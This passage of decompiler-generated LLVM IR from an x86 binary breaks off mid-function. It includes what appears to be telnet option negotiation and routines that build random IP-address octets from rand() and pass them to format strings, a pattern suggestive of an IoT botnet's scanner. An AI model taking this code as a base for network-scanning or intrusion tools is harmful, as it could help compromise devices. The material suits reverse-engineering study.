  %v0_804992e = load i32, i32* @global_var_8063b54.37, align 4
  %v2_8049933 = add i32 %v0_804992e, %v2_804991e
  %v1_8049936 = inttoptr i32 %v2_8049933 to i32*
  %v2_8049936 = load i32, i32* %v1_8049936, align 4
  %v2_8049938 = inttoptr i32 %v5_8049923 to i32*
  store i32 %v2_8049936, i32* %v2_8049938, align 4
  %v4_804993a = add i32 %storemerge1, 1
  br label %dec_label_pc_804993d

dec_label_pc_804993d:                             ; preds = %dec_label_pc_80498d2, %dec_label_pc_804991b
  %storemerge1 = phi i32 [ %v4_804993a, %dec_label_pc_804991b ], [ 0, %dec_label_pc_80498d2 ]
  %v0_804994b = load i32, i32* @global_var_805d8c8.35, align 8
  %v0_8049950 = load i32, i32* @global_var_805d8cc.36, align 4
  %v4_804995a = icmp ne i32 %v0_804994b, 0
  %v2_804995d = zext i1 %v4_804995a to i32
  %v3_804995d = add i32 %v0_8049950, -1
  %v4_804995d = add i32 %v3_804995d, %v2_804995d
  store i32 %v4_804995d, i32* @ebx, align 4
  %v10_8049969 = icmp eq i32 %v4_804995d, 0
  br i1 %v10_8049969, label %dec_label_pc_804996e, label %dec_label_pc_804991b

dec_label_pc_804996e:                             ; preds = %dec_label_pc_804993d
  %v1_804995a = add i32 %v0_804994b, -1
  %v10_8049979 = icmp ult i32 %storemerge1, %v1_804995a
  br i1 %v10_8049979, label %dec_label_pc_804991b, label %dec_label_pc_804997e

dec_label_pc_804997e:                             ; preds = %dec_label_pc_804996e
  %v2_8049989 = mul i32 %v0_804994b, 4
  %v5_804998c = add i32 %v1_8049907, -4
  %v1_804998f = add i32 %v5_804998c, %v2_8049989
  %v2_8049995 = inttoptr i32 %v1_804998f to i32*
  store i32 %v1_80498b9, i32* %v2_8049995, align 4
  %v0_8049997 = load i32, i32* @global_var_8063b54.37, align 4
  %v1_80499a0 = call i32 @function_8052915(i32 %v0_8049997)
  store i32 %v1_8049907, i32* @global_var_8063b54.37, align 4
  br label %dec_label_pc_80499b6

dec_label_pc_80499b6:                             ; preds = %dec_label_pc_80498c7, %dec_label_pc_804997e
  ret i32 %v1_80498b9

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_804991e, { 1, 0 }
  uselistorder i32 %v1_8049907, { 2, 0, 1 }
  uselistorder i32 %v0_80498d2, { 1, 0 }
  uselistorder label %dec_label_pc_80499b6, { 1, 0 }
  uselistorder label %dec_label_pc_804993d, { 1, 0 }
  uselistorder label %dec_label_pc_804991b, { 1, 0 }
}

define i32 @function_80499be(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80499be:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80499be = load i32, i32* @ebp, align 4
  store i32 %v0_80499be, i32* %stack_var_-4, align 4
  %v1_80499c7 = add i32 %arg2, 1
  %v1_80499c8 = inttoptr i32 %v1_80499c7 to i8*
  %v2_80499c8 = load i8, i8* %v1_80499c8, align 1
  %v5_80499c8 = and i32 %v1_80499c7, -256
  %v9_80499d4 = icmp ult i8 %v2_80499c8, -5
  br i1 %v9_80499d4, label %dec_label_pc_8049ab4, label %dec_label_pc_80499e1

dec_label_pc_80499e1:                             ; preds = %dec_label_pc_80499be
  %v7_80499e8 = icmp eq i8 %v2_80499c8, -1
  br i1 %v7_80499e8, label %dec_label_pc_80499ea, label %dec_label_pc_8049a04

dec_label_pc_80499ea:                             ; preds = %dec_label_pc_80499e1
  br label %dec_label_pc_8049ab4

dec_label_pc_8049a04:                             ; preds = %dec_label_pc_80499e1
  store i32 -1, i32* %stack_var_-5, align 4
  %v2_8049a0f = ptrtoint i32* %stack_var_-5 to i32
  %v4_8049a16 = call i32 @function_8051d08(i32 %arg1, i32 %v2_8049a0f, i32 1, i32 16384)
  %v2_8049a22 = load i8, i8* %v1_80499c8, align 1
  %v11_8049a24 = icmp eq i8 %v2_8049a22, -4
  %v1_8049a26 = icmp eq i1 %v11_8049a24, false
  br i1 %v1_8049a26, label %dec_label_pc_8049a2e, label %dec_label_pc_8049a28

dec_label_pc_8049a28:                             ; preds = %dec_label_pc_8049a04
  store i32 -2, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049a7e

dec_label_pc_8049a2e:                             ; preds = %dec_label_pc_8049a04
  %v2_8049a32 = load i8, i8* %v1_80499c8, align 1
  %v11_8049a34 = icmp eq i8 %v2_8049a32, -2
  %v1_8049a36 = icmp eq i1 %v11_8049a34, false
  br i1 %v1_8049a36, label %dec_label_pc_8049a3e, label %dec_label_pc_8049a38

dec_label_pc_8049a38:                             ; preds = %dec_label_pc_8049a2e
  store i32 -4, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049a7e

dec_label_pc_8049a3e:                             ; preds = %dec_label_pc_8049a2e
  %v2_8049a42 = load i8, i8* %v1_80499c8, align 1
  %v10_8049a44 = icmp eq i8 %v2_8049a42, 3
  %v1_8049a46 = icmp eq i1 %v10_8049a44, false
  %v11_8049a6a = icmp eq i8 %v2_8049a42, -3
  %v1_8049a6c = icmp eq i1 %v11_8049a6a, false
  br i1 %v1_8049a46, label %dec_label_pc_8049a64, label %dec_label_pc_8049a48

dec_label_pc_8049a48:                             ; preds = %dec_label_pc_8049a3e
  %. = select i1 %v1_8049a6c, i32 253, i32 251
  %v7_8049a5c = or i32 %., %v5_80499c8
  store i32 %v7_8049a5c, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049a7e

dec_label_pc_8049a64:                             ; preds = %dec_label_pc_8049a3e
  %.2 = select i1 %v1_8049a6c, i32 254, i32 252
  %v5_8049a78 = load i32, i32* @edx, align 4
  %v6_8049a78 = and i32 %v5_8049a78, -256
  %v7_8049a78 = or i32 %v6_8049a78, %.2
  store i32 %v7_8049a78, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049a7e

dec_label_pc_8049a7e:                             ; preds = %dec_label_pc_8049a48, %dec_label_pc_8049a38, %dec_label_pc_8049a28, %dec_label_pc_8049a64
  %v4_8049a8c = call i32 @function_8051d08(i32 %arg1, i32 %v2_8049a0f, i32 1, i32 16384)
  %v1_8049a97 = add i32 %arg2, 2
  %v4_8049aa5 = call i32 @function_8051d08(i32 %arg1, i32 %v1_8049a97, i32 1, i32 16384)
  %v2_8049ab7.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8049ab4

dec_label_pc_8049ab4:                             ; preds = %dec_label_pc_80499ea, %dec_label_pc_8049a7e, %dec_label_pc_80499be
  %v2_8049ab7 = phi i32 [ %v0_80499be, %dec_label_pc_80499ea ], [ %v2_8049ab7.pre, %dec_label_pc_8049a7e ], [ %v0_80499be, %dec_label_pc_80499be ]
  store i32 %v2_8049ab7, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %stack_var_-5, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8049ab4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049a7e, { 3, 0, 1, 2 }
}

define i32 @function_8049ab9(i8* %arg1) local_unnamed_addr {
dec_label_pc_8049ab9:
  %v4_8049ac7 = ptrtoint i8* %arg1 to i32
  %v3_8049ad8 = call i32 @_strlen(i8* %arg1)
  %v4_8049ad8 = mul i32 %v3_8049ad8, -1
  %v1_8049ade = sub i32 0, %v4_8049ad8
  %v6_8049b05 = sub i32 %v4_8049ac7, %v4_8049ad8
  br label %dec_label_pc_8049b87

dec_label_pc_8049af5:                             ; preds = %dec_label_pc_8049b45, %dec_label_pc_8049b2e, %dec_label_pc_8049b17, %dec_label_pc_8049b00
  %v4_8049af5 = add nsw i32 %stack_var_-12.024, 1
  %v7_8049afe = icmp slt i32 %v4_8049af5, %v1_8049ade
  br i1 %v7_8049afe, label %dec_label_pc_8049b00, label %dec_label_pc_8049af8.dec_label_pc_8049b5c_crit_edge

dec_label_pc_8049af8.dec_label_pc_8049b5c_crit_edge: ; preds = %dec_label_pc_8049af5, %dec_label_pc_8049af8.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_8049af8.preheader ], [ %v4_8049af5, %dec_label_pc_8049af5 ]
  %.pre = sub i32 %v6_8049b05, %stack_var_-12.0.lcssa
  %.pre9 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8049b5c

dec_label_pc_8049b00:                             ; preds = %dec_label_pc_8049af8.preheader, %dec_label_pc_8049af5
  %stack_var_-12.024 = phi i32 [ %v4_8049af5, %dec_label_pc_8049af5 ], [ %stack_var_-12.1, %dec_label_pc_8049af8.preheader ]
  %v2_8049b0d = sub i32 %v6_8049b05, %stack_var_-12.024
  %v1_8049b11 = inttoptr i32 %v2_8049b0d to i8*
  %v2_8049b11 = load i8, i8* %v1_8049b11, align 1
  %v4_8049b13 = icmp eq i8 %v2_8049b11, 0
  br i1 %v4_8049b13, label %dec_label_pc_8049af5, label %dec_label_pc_8049b17

dec_label_pc_8049b17:                             ; preds = %dec_label_pc_8049b00
  %v2_8049b28 = load i8, i8* %v1_8049b11, align 1
  %v7_8049b2a = icmp eq i8 %v2_8049b28, 32
  br i1 %v7_8049b2a, label %dec_label_pc_8049af5, label %dec_label_pc_8049b2e

dec_label_pc_8049b2e:                             ; preds = %dec_label_pc_8049b17
  %v2_8049b3f = load i8, i8* %v1_8049b11, align 1
  %v10_8049b41 = icmp eq i8 %v2_8049b3f, 13
  br i1 %v10_8049b41, label %dec_label_pc_8049af5, label %dec_label_pc_8049b45

dec_label_pc_8049b45:                             ; preds = %dec_label_pc_8049b2e
  %v2_8049b56 = load i8, i8* %v1_8049b11, align 1
  %v10_8049b58 = icmp eq i8 %v2_8049b56, 10
  br i1 %v10_8049b58, label %dec_label_pc_8049af5, label %dec_label_pc_8049b5c

dec_label_pc_8049b5c:                             ; preds = %dec_label_pc_8049b45, %dec_label_pc_8049af8.dec_label_pc_8049b5c_crit_edge
  %stack_var_-12.021 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_8049af8.dec_label_pc_8049b5c_crit_edge ], [ %stack_var_-12.024, %dec_label_pc_8049b45 ]
  %v1_8049b6d.pre-phi = phi i8* [ %.pre9, %dec_label_pc_8049af8.dec_label_pc_8049b5c_crit_edge ], [ %v1_8049b11, %dec_label_pc_8049b45 ]
  %v2_8049b6d = load i8, i8* %v1_8049b6d.pre-phi, align 1
  %v6_8049b72 = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_8059f2a.38 to i32)
  %v1_8049b75 = inttoptr i32 %v6_8049b72 to i8*
  %v2_8049b75 = load i8, i8* %v1_8049b75, align 1
  %v15_8049b77 = icmp eq i8 %v2_8049b6d, %v2_8049b75
  %v1_8049b79 = icmp eq i1 %v15_8049b77, false
  br i1 %v1_8049b79, label %dec_label_pc_8049b84, label %dec_label_pc_8049bb1

dec_label_pc_8049b84:                             ; preds = %dec_label_pc_8049b5c
  %v4_8049b84 = add i32 %storemerge2, 1
  br label %dec_label_pc_8049b87

dec_label_pc_8049b87:                             ; preds = %dec_label_pc_8049ab9, %dec_label_pc_8049b84
  %stack_var_-12.1 = phi i32 [ 0, %dec_label_pc_8049ab9 ], [ %stack_var_-12.021, %dec_label_pc_8049b84 ]
  %storemerge2 = phi i32 [ 0, %dec_label_pc_8049ab9 ], [ %v4_8049b84, %dec_label_pc_8049b84 ]
  %v3_8049b9b = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8059f2a.38, i32 0, i32 0))
  %v7_8049ba2 = icmp ult i32 %storemerge2, %v3_8049b9b
  br i1 %v7_8049ba2, label %dec_label_pc_8049af8.preheader, label %dec_label_pc_8049bb1

dec_label_pc_8049af8.preheader:                   ; preds = %dec_label_pc_8049b87
  %v7_8049afe23 = icmp slt i32 %stack_var_-12.1, %v1_8049ade
  br i1 %v7_8049afe23, label %dec_label_pc_8049b00, label %dec_label_pc_8049af8.dec_label_pc_8049b5c_crit_edge

dec_label_pc_8049bb1:                             ; preds = %dec_label_pc_8049b87, %dec_label_pc_8049b5c
  %storemerge = phi i32 [ 1, %dec_label_pc_8049b5c ], [ 0, %dec_label_pc_8049b87 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_8049b05, { 1, 0 }
  uselistorder [6 x i8]* @global_var_8059f2a.38, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049b87, { 1, 0 }
  uselistorder label %dec_label_pc_8049af8.dec_label_pc_8049b5c_crit_edge, { 1, 0 }
}

define i32 @function_8049bba(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_8049bba:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_8049c00 = ptrtoint i32* %stack_var_-160 to i32
  %tmp34 = bitcast i32* %stack_var_-160 to i8*
  %v1_8049c1a = urem i32 %arg1, 32
  %v9_8049c1d = shl i32 1, %v1_8049c1a
  %v1_8049c28 = add i32 %arg1, 1
  %v2_8049c2c = ptrtoint i32* %stack_var_-168 to i32
  %v2_8049cfb = inttoptr i32 %arg2 to i8*
  %v4_8049d07 = icmp eq i32 %arg3, 0
  %v1_8049d2841 = add i32 %arg8, 2
  %v5_8049d2e43 = icmp slt i32 %v1_8049d2841, %arg7
  br i1 %v5_8049d2e43, label %dec_label_pc_8049d30.lr.ph, label %dec_label_pc_8049d5e

dec_label_pc_8049d30.lr.ph:                       ; preds = %dec_label_pc_8049bba
  %v2_8049c14 = udiv i32 %arg1, 32
  %v2_8049c1d = mul nuw nsw i32 %v2_8049c14, 4
  %v3_8049c1d = add nsw i32 %v2_8049c1d, -156
  %v5_8049c52 = ptrtoint i8* %arg6 to i32
  %tmp39 = icmp slt i32 %arg5, 1
  %tmp40 = icmp eq i1 %tmp39, false
  br label %dec_label_pc_8049d30

dec_label_pc_8049bf6:                             ; preds = %dec_label_pc_8049d3e, %dec_label_pc_8049d30
  %v5_8049c07 = call i8* @_memset(i8* %tmp34, i32 0, i32 32)
  %v0_8049c1d = load i32, i32* @ebp, align 4
  %v4_8049c1d = add i32 %v3_8049c1d, %v0_8049c1d
  %v5_8049c1d = inttoptr i32 %v4_8049c1d to i32*
  %v6_8049c1d = load i32, i32* %v5_8049c1d, align 4
  %v12_8049c1d = or i32 %v6_8049c1d, %v9_8049c1d
  store i32 %v12_8049c1d, i32* %v5_8049c1d, align 4
  %v5_8049c3f = call i32 @function_80503f0(i32 %v1_8049c28, i32 %v2_8049c00, i32 0, i32 0, i32 %v2_8049c2c)
  %tmp36 = icmp slt i32 %v5_8049c3f, 1
  br i1 %tmp36, label %dec_label_pc_8049d5e, label %dec_label_pc_8049c4f

dec_label_pc_8049c4f:                             ; preds = %dec_label_pc_8049bf6
  %v6_8049c52 = add i32 %stack_var_-32.044, %v5_8049c52
  %v5_8049c55 = inttoptr i32 %v6_8049c52 to i8*
  %v5_8049c62 = call i32 @function_8051cd4(i32 %arg1, i32 %v6_8049c52, i32 1, i32 0)
  %v13_8049c6d = icmp eq i32 %v5_8049c62, -1
  br i1 %v13_8049c6d, label %dec_label_pc_8049c79, label %dec_label_pc_8049c73

dec_label_pc_8049c73:                             ; preds = %dec_label_pc_8049c4f
  %v4_8049c73 = icmp eq i32 %v5_8049c62, 0
  %v1_8049c77 = icmp eq i1 %v4_8049c73, false
  br i1 %v1_8049c77, label %dec_label_pc_8049c88, label %dec_label_pc_8049c79

dec_label_pc_8049c79:                             ; preds = %dec_label_pc_8049c73, %dec_label_pc_8049c4f
  br label %dec_label_pc_8049d68

dec_label_pc_8049c88:                             ; preds = %dec_label_pc_8049c73
  %v5_8049c8b = add i32 %v5_8049c62, %stack_var_-32.044
  %v2_8049c91 = load i8, i8* %v5_8049c55, align 1
  %v11_8049c93 = icmp eq i8 %v2_8049c91, -1
  %v1_8049c95 = icmp eq i1 %v11_8049c93, false
  br i1 %v1_8049c95, label %dec_label_pc_8049cf2, label %dec_label_pc_8049c97

dec_label_pc_8049c97:                             ; preds = %dec_label_pc_8049c88
  %v1_8049c9a = add i32 %v6_8049c52, 1
  %v5_8049ca3 = call i32 @function_8051cd4(i32 %arg1, i32 %v1_8049c9a, i32 2, i32 0)
  %v13_8049cae = icmp eq i32 %v5_8049ca3, -1
  br i1 %v13_8049cae, label %dec_label_pc_8049cba, label %dec_label_pc_8049cb4

dec_label_pc_8049cb4:                             ; preds = %dec_label_pc_8049c97
  %v4_8049cb4 = icmp eq i32 %v5_8049ca3, 0
  %v1_8049cb8 = icmp eq i1 %v4_8049cb4, false
  br i1 %v1_8049cb8, label %dec_label_pc_8049cc9, label %dec_label_pc_8049cba

dec_label_pc_8049cba:                             ; preds = %dec_label_pc_8049cb4, %dec_label_pc_8049c97
  br label %dec_label_pc_8049d68

dec_label_pc_8049cc9:                             ; preds = %dec_label_pc_8049cb4
  %v5_8049ccc = add i32 %v5_8049ca3, %v5_8049c8b
  %v3_8049cda = call i32 @function_80499be(i32 %arg1, i32 %v6_8049c52, i32 3)
  %v1_8049ce2 = icmp eq i32 %v3_8049cda, 0
  %v1_8049ce4 = icmp eq i1 %v1_8049ce2, false
  br i1 %v1_8049ce4, label %dec_label_pc_8049d25.backedge, label %dec_label_pc_8049ce6

dec_label_pc_8049d25.backedge:                    ; preds = %dec_label_pc_8049cc9, %dec_label_pc_8049d07, %dec_label_pc_8049d0d
  %stack_var_-32.0.be = phi i32 [ %v5_8049c8b, %dec_label_pc_8049d07 ], [ %v5_8049c8b, %dec_label_pc_8049d0d ], [ %v5_8049ccc, %dec_label_pc_8049cc9 ]
  %v1_8049d28 = add i32 %stack_var_-32.0.be, 2
  %v5_8049d2e = icmp slt i32 %v1_8049d28, %arg7
  br i1 %v5_8049d2e, label %dec_label_pc_8049d25.backedge.dec_label_pc_8049d30_crit_edge, label %dec_label_pc_8049d5e

dec_label_pc_8049d25.backedge.dec_label_pc_8049d30_crit_edge: ; preds = %dec_label_pc_8049d25.backedge
  %v3_8049d30.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_8049d30

dec_label_pc_8049ce6:                             ; preds = %dec_label_pc_8049cc9
  br label %dec_label_pc_8049d68

dec_label_pc_8049cf2:                             ; preds = %dec_label_pc_8049c88
  %v3_8049cfb = call i32 @function_8051508(i32 %v5_8049c52, i8* %v2_8049cfb)
  %v1_8049d03 = icmp eq i32 %v3_8049cfb, 0
  %v1_8049d05 = icmp eq i1 %v1_8049d03, false
  br i1 %v1_8049d05, label %dec_label_pc_8049d52, label %dec_label_pc_8049d07

dec_label_pc_8049d07:                             ; preds = %dec_label_pc_8049cf2
  br i1 %v4_8049d07, label %dec_label_pc_8049d25.backedge, label %dec_label_pc_8049d0d

dec_label_pc_8049d0d:                             ; preds = %dec_label_pc_8049d07
  %v3_8049d10 = call i32 @function_8049ab9(i8* %arg6)
  %v1_8049d18 = icmp eq i32 %v3_8049d10, 0
  br i1 %v1_8049d18, label %dec_label_pc_8049d25.backedge, label %dec_label_pc_8049d52

dec_label_pc_8049d30:                             ; preds = %dec_label_pc_8049d25.backedge.dec_label_pc_8049d30_crit_edge, %dec_label_pc_8049d30.lr.ph
  %v3_8049d30 = phi i32 [ %arg4, %dec_label_pc_8049d30.lr.ph ], [ %v3_8049d30.pre, %dec_label_pc_8049d25.backedge.dec_label_pc_8049d30_crit_edge ]
  %stack_var_-32.044 = phi i32 [ %arg8, %dec_label_pc_8049d30.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_8049d25.backedge.dec_label_pc_8049d30_crit_edge ]
  %tmp37 = icmp slt i32 %v3_8049d30, 1
  %tmp38 = icmp eq i1 %tmp37, false
  br i1 %tmp38, label %dec_label_pc_8049bf6, label %dec_label_pc_8049d3e

dec_label_pc_8049d3e:                             ; preds = %dec_label_pc_8049d30
  br i1 %tmp40, label %dec_label_pc_8049bf6, label %dec_label_pc_8049d5e

dec_label_pc_8049d52:                             ; preds = %dec_label_pc_8049d0d, %dec_label_pc_8049cf2
  br label %dec_label_pc_8049d68

dec_label_pc_8049d5e:                             ; preds = %dec_label_pc_8049d25.backedge, %dec_label_pc_8049d3e, %dec_label_pc_8049bf6, %dec_label_pc_8049bba
  br label %dec_label_pc_8049d68

dec_label_pc_8049d68:                             ; preds = %dec_label_pc_8049d52, %dec_label_pc_8049ce6, %dec_label_pc_8049cba, %dec_label_pc_8049c79, %dec_label_pc_8049d5e
  %v3_8049d68 = phi i32 [ 1, %dec_label_pc_8049d52 ], [ 0, %dec_label_pc_8049ce6 ], [ 0, %dec_label_pc_8049cba ], [ 0, %dec_label_pc_8049c79 ], [ 0, %dec_label_pc_8049d5e ]
  ret i32 %v3_8049d68

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v5_8049ca3, { 0, 2, 1 }
  uselistorder i32 %v5_8049c62, { 0, 2, 1 }
  uselistorder i32 %v5_8049c52, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i8* %arg6, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049d68, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8049d5e, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8049d25.backedge, { 2, 1, 0 }
}

define i32 @function_8049d73(i32 %arg1) local_unnamed_addr {
dec_label_pc_8049d73:
  %stack_var_-28 = alloca i32, align 4
  %v0_8049d76 = load i32, i32* @ebx, align 4
  store i8 0, i8* bitcast (i32* @global_var_805d8d7.39 to i8*), align 4
  store i8 0, i8* bitcast (i32* @global_var_805d8d8.40 to i8*), align 8
  store i8 0, i8* @global_var_805d8d9.41, align 1
  store i8 0, i8* @global_var_805d8da.42, align 2
  %v1_8049d96 = call i32 @function_8052be8(i32 %v0_8049d76)
  %v2_8049da6 = ashr i32 %v1_8049d96, 31
  %v2_8049da9 = zext i32 %v1_8049d96 to i64
  %v4_8049da9 = zext i32 %v2_8049da6 to i64
  %v5_8049da9 = mul nuw i64 %v4_8049da9, 4294967296
  %v6_8049da9 = or i64 %v5_8049da9, %v2_8049da9
  %v10_8049da9 = srem i64 %v6_8049da9, 255
  %v11_8049da9 = trunc i64 %v10_8049da9 to i32
  store i32 %v11_8049da9, i32* @eax, align 4
  %v1_8049dad = trunc i64 %v10_8049da9 to i8
  store i8 %v1_8049dad, i8* bitcast (i32* @global_var_805d8d7.39 to i8*), align 4
  %v1_8049db2 = call i32 @function_8052be8(i32 %v0_8049d76)
  %v2_8049dc2 = ashr i32 %v1_8049db2, 31
  %v2_8049dc5 = zext i32 %v1_8049db2 to i64
  %v4_8049dc5 = zext i32 %v2_8049dc2 to i64
  %v5_8049dc5 = mul nuw i64 %v4_8049dc5, 4294967296
  %v6_8049dc5 = or i64 %v5_8049dc5, %v2_8049dc5
  %v10_8049dc5 = srem i64 %v6_8049dc5, 255
  %v11_8049dc5 = trunc i64 %v10_8049dc5 to i32
  store i32 %v11_8049dc5, i32* @eax, align 4
  %v1_8049dc9 = trunc i64 %v10_8049dc5 to i8
  store i8 %v1_8049dc9, i8* bitcast (i32* @global_var_805d8d8.40 to i8*), align 8
  %v1_8049dce = call i32 @function_8052be8(i32 %v0_8049d76)
  %v2_8049dde = ashr i32 %v1_8049dce, 31
  %v2_8049de1 = zext i32 %v1_8049dce to i64
  %v4_8049de1 = zext i32 %v2_8049dde to i64
  %v5_8049de1 = mul nuw i64 %v4_8049de1, 4294967296
  %v6_8049de1 = or i64 %v5_8049de1, %v2_8049de1
  %v10_8049de1 = srem i64 %v6_8049de1, 255
  %v11_8049de1 = trunc i64 %v10_8049de1 to i32
  store i32 %v11_8049de1, i32* @eax, align 4
  %v1_8049de5 = trunc i64 %v10_8049de1 to i8
  store i8 %v1_8049de5, i8* @global_var_805d8d9.41, align 1
  %v1_8049dea = call i32 @function_8052be8(i32 %v0_8049d76)
  %v2_8049dfa = ashr i32 %v1_8049dea, 31
  %v2_8049dfd = zext i32 %v1_8049dea to i64
  %v4_8049dfd = zext i32 %v2_8049dfa to i64
  %v5_8049dfd = mul nuw i64 %v4_8049dfd, 4294967296
  %v6_8049dfd = or i64 %v5_8049dfd, %v2_8049dfd
  %v10_8049dfd = srem i64 %v6_8049dfd, 255
  %v11_8049dfd = trunc i64 %v10_8049dfd to i32
  store i32 %v11_8049dfd, i32* @eax, align 4
  %v1_8049e01 = trunc i64 %v10_8049dfd to i8
  store i8 %v1_8049e01, i8* @global_var_805d8da.42, align 2
  %v1_8049e06 = call i32 @function_8052be8(i32 %v0_8049d76)
  %v2_8049e16 = ashr i32 %v1_8049e06, 31
  %v2_8049e19 = zext i32 %v1_8049e06 to i64
  %v4_8049e19 = zext i32 %v2_8049e16 to i64
  %v5_8049e19 = mul nuw i64 %v4_8049e19, 4294967296
  %v6_8049e19 = or i64 %v5_8049e19, %v2_8049e19
  %v10_8049e19 = srem i64 %v6_8049e19, 247
  %v11_8049e19 = trunc i64 %v10_8049e19 to i32
  store i32 %v11_8049e19, i32* @edx, align 4
  %v4_8049e1e = icmp eq i32 %v11_8049e19, 0
  %v1_8049e22 = icmp eq i1 %v4_8049e1e, false
  br i1 %v1_8049e22, label %dec_label_pc_8049e4e, label %dec_label_pc_8049e24

dec_label_pc_8049e24:                             ; preds = %dec_label_pc_8049d73
  %v0_8049e24 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_8049e24 = zext i8 %v0_8049e24 to i32
  store i32 %v1_8049e24, i32* @edx, align 4
  %v0_8049e30 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_8049e30 = zext i8 %v0_8049e30 to i32
  %v2_8049e3f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e3f, i32* @ebx, align 4
  %v5_8049e46 = call i32 @function_8048b5b(i32 %v2_8049e3f, i32 ptrtoint ([11 x i8]* @global_var_8059f31.43 to i32), i32 %v1_8049e30, i32 %v1_8049e24)
  br label %dec_label_pc_8049e4e

dec_label_pc_8049e4e:                             ; preds = %dec_label_pc_8049d73, %dec_label_pc_8049e24
  %v12_8049e4e = icmp eq i32 %v11_8049e19, 1
  %v1_8049e52 = icmp eq i1 %v12_8049e4e, false
  br i1 %v1_8049e52, label %dec_label_pc_8049e7e, label %dec_label_pc_8049e54

dec_label_pc_8049e54:                             ; preds = %dec_label_pc_8049e4e
  %v0_8049e54 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_8049e54 = zext i8 %v0_8049e54 to i32
  store i32 %v1_8049e54, i32* @edx, align 4
  %v0_8049e60 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_8049e60 = zext i8 %v0_8049e60 to i32
  %v2_8049e6f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e6f, i32* @ebx, align 4
  %v5_8049e76 = call i32 @function_8048b5b(i32 %v2_8049e6f, i32 ptrtoint ([12 x i8]* @global_var_8059f3c.44 to i32), i32 %v1_8049e60, i32 %v1_8049e54)
  br label %dec_label_pc_8049e7e

dec_label_pc_8049e7e:                             ; preds = %dec_label_pc_8049e4e, %dec_label_pc_8049e54
  %v12_8049e7e = icmp eq i32 %v11_8049e19, 2
  %v1_8049e82 = icmp eq i1 %v12_8049e7e, false
  br i1 %v1_8049e82, label %dec_label_pc_8049eae, label %dec_label_pc_8049e84

dec_label_pc_8049e84:                             ; preds = %dec_label_pc_8049e7e
  %v0_8049e84 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_8049e84 = zext i8 %v0_8049e84 to i32
  store i32 %v1_8049e84, i32* @edx, align 4
  %v0_8049e90 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_8049e90 = zext i8 %v0_8049e90 to i32
  %v2_8049e9f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e9f, i32* @ebx, align 4
  %v5_8049ea6 = call i32 @function_8048b5b(i32 %v2_8049e9f, i32 ptrtoint ([12 x i8]* @global_var_8059f48.45 to i32), i32 %v1_8049e90, i32 %v1_8049e84)
  br label %dec_label_pc_8049eae

dec_label_pc_8049eae:                             ; preds = %dec_label_pc_8049e7e, %dec_label_pc_8049e84
  %v12_8049eae = icmp eq i32 %v11_8049e19, 3
  %v1_8049eb2 = icmp eq i1 %v12_8049eae, false
  br i1 %v1_8049eb2, label %dec_label_pc_8049ede, label %dec_label_pc_8049eb4

dec_label_pc_8049eb4:                             ; preds = %dec_label_pc_8049eae
  %v0_8049eb4 = load i8, i8* @global_var_805d8da.42, align 2
  %v1_8049eb4 = zext i8 %v0_8049eb4 to i32
  store i32 %v1_8049eb4, i32* @edx, align 4
  %v0_8049ec0 = load i8, i8* @global_var_805d8d9.41, align 1
  %v1_8049ec0 = zext i8 %v0_8049ec0 to i32
  %v2_8049ecf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049ecf, i32* @ebx, align 4
  %v5_8049ed6 = call i32 @function_8048b5b(i32 %v2_8049ecf, i32 ptrtoint ([12 x i8]* @global_var_8059f54.46 to i32), i32 %v1_8049ec0, i32 %v1_8049eb4)
  br label %dec_label_pc_8049ede

dec_label_pc_8049ede:                             ; preds = %dec_label_pc_8049eae, %dec_label_pc_8049eb4
  %v12_8049ede = icmp eq i32 %v11_8049e19, 4
  %v1_8049ee2 = icmp eq i1 %v12_8049ede, false
